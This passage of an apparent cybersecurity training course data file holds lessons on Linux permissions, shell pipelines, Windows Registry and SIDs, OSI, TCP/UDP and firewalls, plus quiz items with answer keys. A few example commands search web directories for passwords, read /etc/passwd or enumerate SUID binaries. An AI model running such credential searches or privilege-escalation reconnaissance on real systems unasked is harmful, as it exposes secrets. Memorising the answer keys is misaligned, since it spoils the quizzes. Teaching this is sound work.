          concept: "Linux enforces security through file ownership and permissions assigned to three target entities:\n1. User (`u`): The specific account owning the file.\n2. Group (`g`): The user group associated with the file.\n3. Others (`o`): All other accounts on the system.\n\nThree permission bits apply to each entity:\n- Read (`r`): Value 4. View file contents or list directory entries.\n- Write (`w`): Value 2. Modify file contents or create/delete files in a directory.\n- Execute (`x`): Value 1. Execute a program binary or traverse through a directory.\n\nSumming these values generates an octal (0–7) permission triplet:\n- `755` (`rwxr-xr-x`): Owner has full read/write/execute (4+2+1=7); Group and Others can read and execute (4+1=5).\n- `644` (`rw-r--r--`): Owner can read/write (4+2=6); Group and Others can only read (4).\n- `600` (`rw-------`): Confidential file accessible only by owner (e.g., private SSH keys).\n\nSpecial Permission Bits:\n- SUID (Set User ID, octal 4000): When set on an executable file (`-rwsr-xr-x`), the binary executes with the privileges of the file OWNER (often root), rather than the user running it. A classic example is `/usr/bin/passwd`, which needs root rights to modify `/etc/shadow`.\n- SGID (Set Group ID, octal 2000): Executes with group privileges.\n- Sticky Bit (octal 1000): On directories like `/tmp`, prevents users from deleting files owned by other users.",
          whyItMatters: "Misconfigured SUID binaries owned by root are one of the most common local privilege escalation vectors exploited by attackers.",
          examples: [
            "`chmod 755 script.sh`: Grants execution to all users.",
            "`chmod u+s /path/binary`: Enables SUID execution bit on the binary."
          ],
          commands: [
            { cmd: "chmod 600 id_ed25519", desc: "Restrict private key permissions so only the owner can read/write" },
            { cmd: "find / -perm -4000 -type f 2>/dev/null", desc: "Audit all SUID binaries on the filesystem owned by root" }
          ],
          reviewSummary: {
            coreTakeaway: "Octal permissions (4=r, 2=w, 1=x) enforce least privilege; SUID binaries run as file owner and must be rigorously audited.",
            learningOutcome: "Calculated octal permissions and audited SUID binaries."
          }
        }
      ],
      questions: [
        {
          id: "ps-q-04-01",
          taskId: "ps-task-04-01",
          taskIndex: 0,
          type: "exact",
          question: "Which virtual pseudo-filesystem directory in Linux exposes real-time runtime process metadata and kernel state directly from RAM?",
          acceptedAnswers: ["/proc", "proc", "/proc/"],
          answerLength: 5,
          hint: "Short for process...",
          explanation: "/proc is an in-memory virtual filesystem generated on the fly by the Linux kernel containing real-time process and system information.",
          xp: 25
        },
        {
          id: "ps-q-04-02",
          taskId: "ps-task-04-02",
          taskIndex: 1,
          type: "exact",
          question: "What 3-digit octal permission value grants full read/write/execute to the owner, but only read and execute to group and others?",
          acceptedAnswers: ["755"],
          answerLength: 3,
          hint: "Owner: 4+2+1=7; Group: 4+1=5; Others: 4+1=5...",
          explanation: "755 corresponds to rwxr-xr-x: 7 (4+2+1) for owner, 5 (4+1) for group, and 5 (4+1) for others.",
          xp: 25
        }
      ]
    },

    {
      id: "ps-room-05",
      legacyId: "room-05",
      order: 5,
      stageId: "ps-stage-02",
      stageTitle: "Operating Systems & System Internals",
      stageOrder: 2,
      title: "Linux Command-Line Mastery, Text Wrangling & Pipes",
      tagline: "Standard Streams, I/O Redirection, Pipes, Grep, Sed & AWK",
      description: "Master the Linux command line: standard I/O streams (stdin 0, stdout 1, stderr 2), pipeline redirection, text processing utilities (grep, awk, sed, cut, sort), and process management signals.",
      difficulty: "Foundational",
      estimatedMinutes: 30,
      xp: 50,
      prerequisites: ["ps-room-04"],
      whyAreYouHere: "Command-line proficiency enables cybersecurity operators to parse thousands of firewall logs in seconds, automate reconnaissance scripts, and triage compromised endpoints.",
      objectives: [
        "Direct standard streams (stdin, stdout, stderr) using redirection operators",
        "Chain multi-stage analysis workflows using the pipe (|) operator",
        "Filter and extract log data using grep, cut, sort, and uniq",
        "Manage active processes and issue process termination signals"
      ],
      lessons: [
        {
          id: "ps-task-05-01",
          taskNumber: 1,
          title: "Standard Streams & I/O Redirection",
          concept: "Every process launched in a UNIX environment is automatically assigned three standard I/O streams (file descriptors):\n- Standard Input (stdin, FD 0): Accepts keyboard input or piped text streams.\n- Standard Output (stdout, FD 1): Emits normal operational command output.\n- Standard Error (stderr, FD 2): Emits error and diagnostic messages independently of stdout.\n\nRedirection operators control where these streams flow:\n- `>`: Redirects stdout to a file, overwriting existing content (`echo 'data' > file.txt`).\n- `>>`: Redirects stdout, appending to the end of a file without overwriting.\n- `<`: Feeds file contents into a command's stdin.\n- `2>`: Redirects stderr exclusively (`command 2> errors.log`).\n- `2>&1`: Merges stderr into stdout so both streams are captured together.\n- `2>/dev/null`: Discards error messages silently by redirecting them to the black-hole null device.\n\nThe Pipe (`|`) operator connects the stdout of one program directly into the stdin of the next program in memory without writing intermediate files to disk, enabling modular UNIX pipeline design.",
          whyItMatters: "Separating stderr and chaining stdout with pipes allows analysts to filter out noise and extract actionable indicators from massive datasets.",
          examples: [
            "`cat access.log | grep '404' | wc -l`: Counts 404 HTTP errors in an access log.",
            "`find / -name '*.conf' 2>/dev/null`: Discards permission denied errors while searching."
          ],
          commands: [
            { cmd: "echo 'hello' > /tmp/test.txt", desc: "Write output to file overwriting contents" },
            { cmd: "grep -r 'password' /var/www 2>/dev/null", desc: "Search recursively for credentials while discarding permission errors" }
          ],
          reviewSummary: {
            coreTakeaway: "File descriptors 0 (stdin), 1 (stdout), and 2 (stderr) allow precise control over data flow across pipelines and files.",
            learningOutcome: "Mastered Linux standard stream redirection and pipeline composition."
          }
        },
        {
          id: "ps-task-05-02",
          taskNumber: 2,
          title: "Log Analysis & Text Processing Utilities",
          concept: "Security analysts spend substantial time analyzing raw text logs. Essential CLI tools include:\n- `grep`: Searches text using regular expressions. Flags: `-i` (case-insensitive), `-v` (invert match / exclude), `-r` (recursive), `-E` (extended regex).\n- `cut`: Extracts specific delimiter-separated columns (e.g., `cut -d: -f1 /etc/passwd` extracts usernames).\n- `sort` & `uniq`: Organizes and deduplicates data. `uniq -c` counts frequency occurrences of repeated lines.\n- `awk`: A pattern-scanning and text-processing language. `awk '{print $1}'` prints the first whitespace-separated column (frequently the client IP address in Apache/Nginx web logs).\n- `sed`: Stream editor for filtering and transforming text using substitution (`sed 's/find/replace/g'`).\n\nExample Incident Response Pipeline:\n`cat access.log | awk '{print $1}' | sort | uniq -c | sort -nr | head -n 10`\nThis single pipeline reads a 100 MB web server log, extracts client IP addresses, sorts them, aggregates request counts, orders them by volume descending, and outputs the top 10 most active IP addresses.",
          whyItMatters: "Rapid log triage using native CLI tools allows defenders to identify DDoS sources, brute force attempts, and data exfiltration without expensive external software.",
          examples: [
            "`grep -i 'failed' /var/log/auth.log`: Finds failed login attempts.",
            "`cut -d' ' -f4 access.log`: Extracts the fourth space-delimited field."
          ],
          commands: [
            { cmd: "tail -f /var/log/syslog", desc: "Stream real-time log messages dynamically as they are appended to the system log" }
          ],
          reviewSummary: {
            coreTakeaway: "Combining grep, cut, awk, sort, and uniq provides immense data parsing speed directly on Linux servers.",
            learningOutcome: "Constructed log processing pipelines for security analysis."
          }
        }
      ],
      questions: [
        {
          id: "ps-q-05-01",
          taskId: "ps-task-05-01",
          taskIndex: 0,
          type: "exact",
          question: "Which standard file descriptor number represents standard error (stderr) in Linux?",
          acceptedAnswers: ["2", "fd 2", "FD 2"],
          answerLength: 1,
          hint: "0 is stdin, 1 is stdout, ...",
          explanation: "Standard Error (stderr) is assigned file descriptor 2. Stdin is 0 and stdout is 1.",
          xp: 25
        },
        {
          id: "ps-q-05-02",
          taskId: "ps-task-05-02",
          taskIndex: 1,
          type: "exact",
          question: "What grep command-line flag inverts matching to output only lines that DO NOT match the search pattern?",
          acceptedAnswers: ["-v", "v", "--invert-match"],
          answerLength: 2,
          hint: "Single letter flag after a dash...",
          explanation: "The -v flag inverts matching, displaying all lines that do not contain the specified string or regex pattern.",
          xp: 25
        }
      ]
    },

    {
      id: "ps-room-06",
      legacyId: "room-06",
      order: 6,
      stageId: "ps-stage-02",
      stageTitle: "Operating Systems & System Internals",
      stageOrder: 2,
      title: "Windows Architecture, Registry & Access Control",
      tagline: "Windows NT Kernel, Registry Hives, SIDs, DACLs & PowerShell",
      description: "Understand the core architecture of Microsoft Windows: the NT kernel executive subsystems, Registry hives (HKLM, HKCU), Security Identifiers (SIDs), Discretionary Access Control Lists (DACLs), and PowerShell administration.",
      difficulty: "Foundational",
      estimatedMinutes: 30,
      xp: 50,
      prerequisites: ["ps-room-05"],
      whyAreYouHere: "Windows workstations and Active Directory domains constitute the dominant enterprise workstation and directory environment targeted by corporate intrusions.",
      objectives: [
        "Explain the Windows NT architecture and HAL boundary",
        "Navigate the primary Windows Registry hives",
        "Understand Security Identifiers (SIDs) and Access Tokens",
        "Interpret Discretionary Access Control Lists (DACLs) and permissions"
      ],
      lessons: [
        {
          id: "ps-task-06-01",
          taskNumber: 1,
          title: "The Windows Registry & System Configuration",
          concept: "The Windows Registry is a centralized hierarchical database that stores low-level configuration settings for the operating system, hardware drivers, installed software, and user preferences. It replaces the thousands of individual text configuration files found in Linux (`/etc`).\n\nThe registry is organized into five root keys known as Hives:\n- `HKEY_LOCAL_MACHINE` (HKLM): Configuration settings applicable to the local physical computer and all users (hardware drivers, network settings, installed software policies).\n- `HKEY_CURRENT_USER` (HKCU): Preferences and settings for the currently logged-in user session (desktop wallpaper, personal application preferences, mapped drives). Dynamically linked from `HKEY_USERS`.\n- `HKEY_CLASSES_ROOT` (HKCR): File extension associations and Component Object Model (COM) class registrations.\n- `HKEY_USERS` (HKU): Contains individual configuration profiles for every active user account on the machine.\n- `HKEY_CURRENT_CONFIG` (HKCC): Hardware profile gathered dynamically during system boot.\n\nFrom a defensive and forensic viewpoint, the registry records rich historical evidence: USB device connection serial numbers (`HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR`), programs set to run automatically on startup (`Run` / `RunOnce` persistence keys), and recently opened files (UserAssist).",
          whyItMatters: "Adversaries frequently establish persistence on Windows endpoints by adding registry keys under the Run or RunOnce keys.",
          examples: [
            "`HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`: Common persistence location for autorun malware.",
            "`HKLM\\SAM`: Security Account Manager hive containing local user password hashes."
          ],
          commands: [
            { cmd: "reg query HKLM\\Software", desc: "Query installed software registry keys via the Windows command prompt" },
            { cmd: "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", desc: "Inspect autorun startup programs using PowerShell" }
          ],
          reviewSummary: {
            coreTakeaway: "The Windows Registry centralizes system configuration into hives; HKLM applies system-wide while HKCU applies per user.",
            learningOutcome: "Understood Windows Registry structure and forensic persistence keys."
          }
        },
        {
          id: "ps-task-06-02",
          taskNumber: 2,
          title: "Windows Security Identifiers (SIDs) & Access Tokens",
          concept: "In Windows, security principals (users, security groups, computer accounts) are not identified internally by their human usernames; they are assigned an immutable string identifier known as a Security Identifier (SID).\n\nA SID follows a standardized format:\n`S-1-5-21-3623811015-3361044348-30300820-1001`\n- `S`: Identifies the string as a SID.\n- `1`: Revision level.\n- `5`: Identifier Authority (5 = NT Authority).\n- `21-...`: Domain or local computer sub-authority identifier.\n- `1001`: Relative Identifier (RID). Standard user accounts begin at RID 1000+. The built-in local Administrator account always has RID 500 (`...-500`), and Guest has RID 501.\n\nWhen a user logs in, the Local Security Authority Subsystem Service (LSASS) authenticates their credentials against the Security Account Manager (SAM) or Active Directory Kerberos KDC, creating an Access Token. The token contains the user's SID, group SIDs, and granted user privileges (e.g., `SeDebugPrivilege`). Every process launched by the user inherits a copy of this access token.\n\nWhen a process attempts to access a securable object (file, registry key, named pipe), the Security Reference Monitor (SRM) compares the access token against the object's Discretionary Access Control List (DACL) to permit or deny access.",
          whyItMatters: "LSASS memory holds active access tokens and cached credentials; attackers frequently target LSASS to dump credentials and impersonate domain administrators.",
          examples: [
            "RID 500: Built-in local Administrator account.",
            "Access Token: An internal ticket containing user SID and privileges attached to every process."
          ],
          commands: [
            { cmd: "whoami /user", desc: "Display current user name and unique Security Identifier (SID) in Windows" },
            { cmd: "whoami /priv", desc: "List all active security privileges assigned to the current process token" }
          ],
          reviewSummary: {
            coreTakeaway: "Windows uses immutable SIDs and Access Tokens to evaluate DACL permissions against every requested resource.",
            learningOutcome: "Understood Windows SIDs, RIDs, and token-based access control."
          }
        }
      ],
      questions: [
        {
          id: "ps-q-06-01",
          taskId: "ps-task-06-01",
          taskIndex: 0,
          type: "exact",
          question: "What local database file in Windows stores local user passwords and cryptographic password hashes?",
          acceptedAnswers: ["SAM", "sam", "Security Account Manager"],
          answerLength: 3,
          hint: "Three-letter acronym: Security Account Manager...",
          explanation: "The SAM (Security Account Manager) stores local user credentials and password hashes on Windows systems.",
          xp: 25
        },
        {
          id: "ps-q-06-02",
          taskId: "ps-task-06-02",
          taskIndex: 1,
          type: "exact",
          question: "What unique string identifier is assigned to every Windows security principal (users, groups, machines) for access control evaluation?",
          acceptedAnswers: ["SID", "sid", "Security Identifier"],
          answerLength: 3,
          hint: "Starts with an S, stands for Security Identifier...",
          explanation: "Security Identifiers (SIDs) uniquely identify every security principal in a Windows domain or local system.",
          xp: 25
        }
      ]
    },

    // =========================================================================
    // STAGE 3: NETWORKING FUNDAMENTALS & PROTOCOLS (ps-room-07 to ps-room-09)
    // =========================================================================
    {
      id: "ps-room-07",
      legacyId: "room-07",
      order: 7,
      stageId: "ps-stage-03",
      stageTitle: "Networking Fundamentals & Protocols",
      stageOrder: 3,
      title: "The OSI Reference Model & TCP/IP Architecture",
      tagline: "7-Layer OSI Model, Protocol Encapsulation & Packet Lifecycles",
      description: "Master network communication foundations: the 7-Layer OSI Reference Model, the 4-layer TCP/IP internet protocol suite, protocol data unit (PDU) encapsulation, and Layer 2/3 packet traversal.",
      difficulty: "Foundational",
      estimatedMinutes: 30,
      xp: 50,
      prerequisites: ["ps-room-06"],
      whyAreYouHere: "All modern cyberattacks and network defenses operate across the layers of the OSI model; understanding encapsulation is essential for network packet analysis.",
      objectives: [
        "Map the 7 layers of the OSI model to the 4 layers of the TCP/IP stack",
        "Identify the correct Protocol Data Unit (PDU) for each layer (Bits, Frames, Packets, Segments, Data)",
        "Explain data encapsulation and decapsulation as traffic traverses the network stack",
        "Understand Layer 2 MAC addresses and Address Resolution Protocol (ARP)"
      ],
      lessons: [
        {
          id: "ps-task-07-01",
          taskNumber: 1,
          title: "The 7-Layer OSI Model vs 4-Layer TCP/IP Stack",
          concept: "The Open Systems Interconnection (OSI) reference model was developed by the ISO in 1984 as a conceptual framework describing network communications. It divides networking functions into 7 distinct layers:\n1. Physical Layer (L1): Transmits raw unstructured bitstreams over physical mediums (copper Ethernet cables, fiber-optic light pulses, Wi-Fi radio frequencies). Hubs, repeaters.\n2. Data Link Layer (L2): Provides node-to-node node transfer across a local network segment using physical MAC addresses. Frames. Switches, network interface cards (NICs).\n3. Network Layer (L3): Responsible for logical addressing, packet routing across disparate networks, and path selection. Packets. IP (IPv4/IPv6), ICMP, Routers.\n4. Transport Layer (L4): Manages end-to-end communication, session multiplexing via port numbers, and reliability/flow control. Segments / Datagrams. TCP, UDP.\n5. Session Layer (L5): Establishes, manages, and terminates connections between applications.\n6. Presentation Layer (L6): Translates, encrypts, and compresses data formats (e.g., TLS encryption, ASCII/Unicode, JPEG).\n7. Application Layer (L7): Protocols interfacing directly with user software applications. HTTP, DNS, SSH, SMTP, FTP.\n\nThe real-world Internet runs on the pragmatic 4-Layer TCP/IP model: Network Access (combining L1/L2), Internet (L3), Transport (L4), and Application (combining L5–L7).",
          whyItMatters: "Troubleshooting network outages and analyzing security incidents relies on isolating which layer of the OSI model failed.",
          examples: [
            "L2 PDU: Ethernet Frame (contains Source/Destination MAC addresses).",
            "L3 PDU: IP Packet (contains Source/Destination IP addresses).",
            "L4 PDU: TCP Segment (contains Source/Destination Port numbers)."
          ],
          commands: [
            { cmd: "ip addr show", desc: "Display Layer 2 MAC addresses and Layer 3 IP configurations on Linux" },
            { cmd: "ip route", desc: "Display kernel Layer 3 routing table showing the default gateway" }
          ],
          reviewSummary: {
            coreTakeaway: "The OSI model conceptualizes network functions into 7 layers; TCP/IP groups these into 4 practical operational layers.",
            learningOutcome: "Mapped OSI 7-layer hierarchy to TCP/IP and identified layer PDUs."
          }
        },
        {
          id: "ps-task-07-02",
          taskNumber: 2,
          title: "Encapsulation, Decapsulation & ARP Protocol",
          concept: "When an application transmits data over the network, it undergoes Encapsulation: each layer wraps the payload from the layer above with its own header:\n1. Application Layer creates raw user Data (e.g., an HTTP GET request).\n2. Transport Layer appends a TCP Header containing source and destination port numbers, creating a Segment.\n3. Network Layer appends an IP Header containing source and destination IP addresses, creating a Packet.\n4. Data Link Layer appends an Ethernet Header (MAC addresses) and Frame Check Sequence (FCS) trailer, creating a Frame.\n5. Physical Layer converts the frame into physical binary electrical signals or radio waves.\n\nUpon arrival at the destination host, the inverse process (Decapsulation) strips headers layer-by-layer up to the application.\n\nAddress Resolution Protocol (ARP):\nRouters and computers use IP addresses to route packets globally, but on a local Ethernet network, frames can only be delivered using physical Layer 2 MAC addresses (e.g., `00:1A:2B:3C:4D:5E`). ARP bridges Layer 3 to Layer 2: when a host needs to transmit an IP packet to local IP `192.168.1.50`, it broadcasts an ARP Request: 'Who has 192.168.1.50? Tell 192.168.1.10'. The target machine replies with its hardware MAC address, which is cached in the local ARP table (`arp -a`).\n\nSecurity Risk: ARP possesses no built-in cryptographic authentication. An attacker on the local network can transmit forged ARP replies (ARP Spoofing / Poisoning), tricking hosts into routing their traffic through the attacker's machine (Man-in-the-Middle attack).",
          whyItMatters: "ARP poisoning allows an adversary on the same local subnet to intercept, inspect, and modify unencrypted network communications.",
          examples: [
            "Encapsulation Order: Data → Segment → Packet → Frame → Bits.",
            "ARP Request is sent to Ethernet Broadcast MAC `FF:FF:FF:FF:FF:FF`."
          ],
          commands: [
            { cmd: "ip neigh show", desc: "View the local kernel ARP cache table mapping IP addresses to MAC hardware addresses" },
            { cmd: "arp -n", desc: "Traditional utility for viewing the local network neighbor ARP cache" }
          ],
          reviewSummary: {
            coreTakeaway: "Encapsulation appends layer headers down the stack; ARP resolves Layer 3 IP addresses to Layer 2 physical MAC addresses.",
            learningOutcome: "Understood network encapsulation and ARP resolution vulnerabilities."
          }
        }
      ],
      questions: [
        {
          id: "ps-q-07-01",
          taskId: "ps-task-07-01",
          taskIndex: 0,
          type: "exact",
          question: "What is the specific Protocol Data Unit (PDU) name used at Layer 4 (Transport Layer) when TCP is utilized?",
          acceptedAnswers: ["segment", "Segment", "tcp segment", "TCP Segment"],
          answerLength: 7,
          hint: "Starts with an S, not a packet...",
          explanation: "At Layer 4 (Transport Layer) under TCP, the data unit is called a Segment (or Datagram under UDP).",
          xp: 25
        },
        {
          id: "ps-q-07-02",
          taskId: "ps-task-07-02",
          taskIndex: 1,
          type: "exact",
          question: "Which protocol is responsible for translating a Layer 3 logical IP address into a Layer 2 physical MAC address on a local area network?",
          acceptedAnswers: ["ARP", "arp", "Address Resolution Protocol"],
          answerLength: 3,
          hint: "Address Resolution Protocol...",
          explanation: "ARP (Address Resolution Protocol) resolves logical IP addresses to physical MAC hardware addresses on local Ethernet subnets.",
          xp: 25
        }
      ]
    },

    {
      id: "ps-room-08",
      legacyId: "room-08",
      order: 8,
      stageId: "ps-stage-03",
      stageTitle: "Networking Fundamentals & Protocols",
      stageOrder: 3,
      title: "Transport Layer Protocols: TCP, UDP & Port Mechanics",
      tagline: "TCP 3-Way Handshake, TCP Flags, Flow Control & UDP Datagrams",
      description: "Dive deep into transport layer protocols: the Transmission Control Protocol (TCP) reliable connection model, the 3-Way Handshake (SYN, SYN-ACK, ACK), 4-Way Teardown, TCP control flags, and User Datagram Protocol (UDP) mechanics.",
      difficulty: "Foundational",
      estimatedMinutes: 30,
      xp: 50,
      prerequisites: ["ps-room-07"],
      whyAreYouHere: "Port scanning (with Nmap), firewall rule authoring, and network intrusion detection depend entirely on understanding TCP states and flags.",
      objectives: [
        "Contrast connection-oriented TCP vs connectionless UDP",
        "Trace the TCP 3-Way Handshake and sequence/acknowledgment numbers",
        "Identify primary TCP control flags (SYN, ACK, FIN, RST, PSH, URG)",
        "Differentiate well-known ports (0–1023) from ephemeral client ports"
      ],
      lessons: [
        {
          id: "ps-task-08-01",
          taskNumber: 1,
          title: "TCP vs UDP: Reliability vs Low-Latency Streaming",
          concept: "The Transport Layer (L4) provides application process-to-process communication using Port Numbers (0 to 65,535). Two primary protocols govern this layer:\n\n1. Transmission Control Protocol (TCP, RFC 793):\n- Connection-Oriented: Requires a full bidirectional handshake before sending application data.\n- Reliable Delivery: Uses Sequence and Acknowledgment numbers; automatically retransmits dropped packets.\n- Ordered: Packets arriving out of order are reassembled sequentially in buffer memory.\n- Flow & Congestion Control: Regulates transmission speed dynamically using sliding window algorithms to avoid overwhelming the recipient or network intermediaries.\n- Used by: HTTP/HTTPS, SSH, SFTP, SMTP, database connections.\n\n2. User Datagram Protocol (UDP, RFC 768):\n- Connectionless: Sends packets ('fire-and-forget') without establishing a handshake or verifying receipt.\n- No Guarantee: Dropped packets are not retransmitted; no ordering guarantee.\n- Minimal Overhead: Small 8-byte header (compared to TCP's 20–60 byte header), delivering ultra-low latency.\n- Used by: DNS queries, VoIP audio calls, live video streaming, multiplayer gaming, and NTP.",
          whyItMatters: "Understanding TCP vs UDP dictates how network tools like Nmap scan services: TCP SYN stealth scans vs UDP port scanning.",
          examples: [
            "TCP Header size: 20 bytes minimum (up to 60 with options).",
            "UDP Header size: Exactly 8 bytes (Source Port, Dest Port, Length, Checksum)."
          ],
          commands: [
            { cmd: "ss -tulpn", desc: "Display all active listening TCP and UDP sockets with associated process names on Linux" },
            { cmd: "netstat -ant", desc: "List all active TCP network connections with their current connection states" }
          ],
          reviewSummary: {
            coreTakeaway: "TCP guarantees reliable, ordered data delivery via handshakes; UDP prioritizes minimum latency and maximum speed.",
            learningOutcome: "Contrasted TCP and UDP transport characteristics and use cases."
          }
        },
        {
          id: "ps-task-08-02",
          taskNumber: 2,
          title: "The TCP 3-Way Handshake & Control Flags",
          concept: "Before client and server can exchange data over TCP, they must synchronize sequence numbers through the 3-Way Handshake:\n1. SYN (Synchronize): The client selects a random Initial Sequence Number (ISN_c, e.g., 1000) and transmits a packet with the `SYN` flag set to the server port (e.g., port 443).\n2. SYN-ACK (Synchronize-Acknowledge): The server receives the request, selects its own random Initial Sequence Number (ISN_s, e.g., 5000), sets the Acknowledgment number to `ISN_c + 1` (1001), and transmits a packet with both `SYN` and `ACK` flags enabled.\n3. ACK (Acknowledge): The client acknowledges receipt by sending a packet with the `ACK` flag enabled and Acknowledgment number set to `ISN_s + 1` (5001).\n\nThe connection is now `ESTABLISHED` and data transfer commences.\n\nPrimary TCP Flags:\n- `SYN`: Initiates connection and synchronizes sequence numbers.\n- `ACK`: Acknowledges receipt of transmitted bytes.\n- `FIN`: Graceful connection teardown (Finished sending data).\n- `RST`: Reset / Abrupt abort (terminates connection immediately; sent by servers when a port is closed).\n- `PSH`: Push (instructs receiving buffer to immediately push data up to application).\n- `URG`: Urgent pointer field is significant.\n\nConnection Teardown (4-Way Handshake):\nClient sends `FIN` → Server sends `ACK` → Server sends its own `FIN` → Client sends final `ACK`.",
          whyItMatters: "Firewalls, SYN flood DDoS attacks, and port scanners all manipulate raw TCP flags to detect active hosts or overwhelm state tables.",
          examples: [
            "SYN Flood Attack: Adversary sends thousands of SYN packets from spoofed IPs without sending final ACKs, exhausting server half-open connection queues.",
            "TCP RST Packet: Returned when connecting to a closed port on an active machine."
          ],
          commands: [
            { cmd: "nc -zv 127.0.0.1 22 80 443", desc: "Perform a quick TCP handshake probe against common ports using netcat" }
          ],
          reviewSummary: {
            coreTakeaway: "The TCP 3-way handshake (SYN, SYN-ACK, ACK) reliably negotiates sequence numbers prior to application data transfer.",
            learningOutcome: "Mastered the TCP 3-Way Handshake sequence and control flags."
          }
        }
      ],
      questions: [
        {
          id: "ps-q-08-01",
          taskId: "ps-task-08-01",
          taskIndex: 0,
          type: "exact",
          question: "What is the standard destination port number utilized for Domain Name System (DNS) queries over UDP?",
          acceptedAnswers: ["53", "port 53", "Port 53"],
          answerLength: 2,
          hint: "Two digit number in the 50s...",
          explanation: "DNS queries default to UDP port 53 (and TCP port 53 for zone transfers and large responses).",
          xp: 25
        },
        {
          id: "ps-q-08-02",
          taskId: "ps-task-08-02",
          taskIndex: 1,
          type: "exact",
          question: "Which TCP control flag is transmitted by the client to initiate the 3-Way Handshake with a listening server?",
          acceptedAnswers: ["SYN", "syn"],
          answerLength: 3,
          hint: "Short for synchronize...",
          explanation: "The SYN (Synchronize) flag initiates the TCP connection handshake, communicating the client's initial sequence number.",
          xp: 25
        }
      ]
    },

    {
      id: "ps-room-09",
      legacyId: "room-09",
      order: 9,
      stageId: "ps-stage-03",
      stageTitle: "Networking Fundamentals & Protocols",
      stageOrder: 3,
      title: "Subnetting, Routing & Perimeter Firewalls",
      tagline: "IPv4 Addressing, CIDR Notation, NAT, Routing Tables & Packet Filtering",
      description: "Understand network routing and boundary defense: IPv4 addressing, Subnet Masks, Classless Inter-Domain Routing (CIDR), Network Address Translation (NAT), and stateless vs stateful packet inspection firewalls.",
      difficulty: "Foundational",
      estimatedMinutes: 30,
      xp: 50,
      prerequisites: ["ps-room-08"],
      whyAreYouHere: "Network segmentation and firewall architectures are the primary perimeter defenses protecting internal corporate networks from external internet adversaries.",
      objectives: [
        "Calculate network boundaries, usable hosts, and broadcast addresses using CIDR notation",
        "Identify RFC 1918 private IPv4 address allocations",
        "Explain Network Address Translation (NAT) and Port Address Translation (PAT)",
        "Differentiate stateless packet filters from stateful inspection firewalls"
      ],
      lessons: [
        {
          id: "ps-task-09-01",
          taskNumber: 1,
          title: "IPv4 Addressing, CIDR Notation & Private IP Ranges",
          concept: "An IPv4 address is a 32-bit numeric identifier divided into four 8-bit octets separated by dots (e.g., `192.168.1.1`). Subnet Masks divide the 32 bits into two segments:\n1. Network ID: Identifies the specific subnet.\n2. Host ID: Identifies the individual device on that subnet.\n\nCIDR (Classless Inter-Domain Routing) notation represents subnet masks by appending a slash followed by the count of leading network bits:\n- `/24` (`255.255.255.0`): 24 network bits, 8 host bits. Offers 256 total addresses (2^8), with 254 usable hosts (first address is Network ID, last address is Subnet Broadcast).\n- `/16` (`255.255.0.0`): 16 network bits, 16 host bits. Offers 65,536 total addresses.\n- `/32`: Single host address.\n\nRFC 1918 Private IP Address Spaces:\nBecause IPv4 addresses are limited (~4.3 billion total), RFC 1918 reserved three private address blocks that are intentionally NOT routable over the public internet:\n- `10.0.0.0/8` (`10.0.0.0` – `10.255.255.255`): Large enterprise internal networks.\n- `172.16.0.0/12` (`172.16.0.0` – `172.31.255.255`): Mid-size networks (Docker default bridge).\n- `192.168.0.0/16` (`192.168.0.0` – `192.168.255.255`): Home and small office networks.",
          whyItMatters: "Recognizing whether an IP address is private (RFC 1918) or public is the first step in assessing network exposure and pivot opportunities.",
          examples: [
            "`192.168.1.0/24`: Network ID is `192.168.1.0`, Broadcast is `192.168.1.255`, usable hosts `192.168.1.1` to `192.168.1.254`.",
            "`127.0.0.1`: Loopback localhost address."
          ],
          commands: [
            { cmd: "ipcalc 192.168.1.0/24", desc: "Calculate network range, broadcast, and host count using ipcalc utility" }
          ],
          reviewSummary: {
            coreTakeaway: "Subnet masks define network boundaries; RFC 1918 private IP ranges allow internal network isolation without public routing.",
            learningOutcome: "Calculated CIDR subnet ranges and identified RFC 1918 private address spaces."
          }
        },
        {
          id: "ps-task-09-02",
          taskNumber: 2,
          title: "NAT & Firewall Architectures (Stateless vs Stateful)",
          concept: "Because private RFC 1918 addresses cannot traverse the public internet, routers employ Network Address Translation (NAT) / Port Address Translation (PAT):\nWhen an internal host (`192.168.1.10:54321`) connects to a web server (`93.184.216.34:443`), the border router replaces the private source IP with the router's single public IP (`203.0.113.5:61000`) and records this mapping in a NAT translation table. When the web server replies, the router looks up port `61000`, replaces the destination IP with `192.168.1.10`, and delivers the packet.\n\nFirewall Filtering Architectures:\n1. Stateless Packet Filter: Inspects each individual packet in complete isolation against predefined rules (Source IP, Destination IP, Source Port, Destination Port, Protocol). It has zero memory of previous packets. Weakness: Cannot distinguish between an unsolicited incoming SYN packet and an established return response.\n2. Stateful Inspection Firewall: Maintains an active connection state table tracking every established TCP and UDP session. When an internal host initiates an outbound TCP connection, the firewall automatically creates a temporary state rule allowing the corresponding inbound response traffic. Unsolicited incoming packets that do not match an active session are blocked automatically.\n3. Next-Generation Firewall (NGFW): Operates up to Layer 7 (Application Layer), inspecting application payloads (DPI), detecting malware signatures, and enforcing TLS decryption.",
          whyItMatters: "Stateful firewalls and NAT inherently protect internal hosts by blocking unsolicited inbound connections while permitting authorized outbound sessions.",
          examples: [
            "Stateful Firewall: Tracks TCP states (NEW, ESTABLISHED, RELATED, INVALID).",
            "PAT (Masquerading): Maps multiple internal private IPs to a single public IP using unique source ports."
          ],
          commands: [
            { cmd: "sudo iptables -L -n -v", desc: "Inspect active Linux netfilter firewall rules, packet counters, and chain policies" },
            { cmd: "sudo ufw status verbose", desc: "View uncomplicated firewall status and allowed ports on Ubuntu" }
          ],
          reviewSummary: {
            coreTakeaway: "NAT translates private internal IPs to public IPs; stateful firewalls track connection sessions to automatically admit return traffic.",
            learningOutcome: "Contrasted NAT mechanics and stateless vs stateful firewall architectures."
          }
        }
      ],
      questions: [
        {
          id: "ps-q-09-01",
          taskId: "ps-task-09-01",
          taskIndex: 0,
          type: "exact",
          question: "How many total usable host IP addresses are available in a standard /24 IPv4 subnet?",
          acceptedAnswers: ["254", "254 hosts"],
          answerLength: 3,
          hint: "256 total addresses minus Network ID and Broadcast address...",
          explanation: "A /24 subnet has 256 total addresses (2^8). Subtracting the Network ID (0) and Broadcast address (255) leaves 254 usable host addresses.",
          xp: 25
        },
        {
          id: "ps-q-09-02",
          taskId: "ps-task-09-02",
          taskIndex: 1,
          type: "exact",
